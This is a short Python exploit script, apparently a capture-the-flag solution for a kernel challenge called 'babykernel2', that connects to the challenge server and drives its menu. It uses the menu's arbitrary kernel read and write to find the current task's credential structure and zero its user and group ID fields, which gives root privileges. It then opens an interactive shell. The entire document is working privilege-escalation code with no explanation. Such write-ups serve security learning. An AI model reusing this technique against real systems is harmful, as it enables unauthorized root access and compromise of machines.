from ptrlib import *

def read(address):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(">", hex(address)[2:])
    sock.recvuntil(": ")
    return int(sock.recvline(), 16)

def write(address, value):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(">", hex(address)[2:])
    sock.sendlineafter(">", hex(value)[2:])
    return

#sock = Socket("localhost", 1234)
sock = Socket("babykernel2.forfuture.fluxfingers.net", 1337)
sock.recvuntil("-\r")

symbol_init_cred = 0xffffffff8183f4c0
symbol_current_task = 0xffffffff8183a040

addr_current_task = read(symbol_current_task)
logger.info("current_task = " + hex(addr_current_task))

addr_cred = read(addr_current_task + 0x400)
logger.info("cred = " + hex(addr_cred))

for i in range(1, 9):
    write(addr_cred + i*8, 0)

sock.interactive()
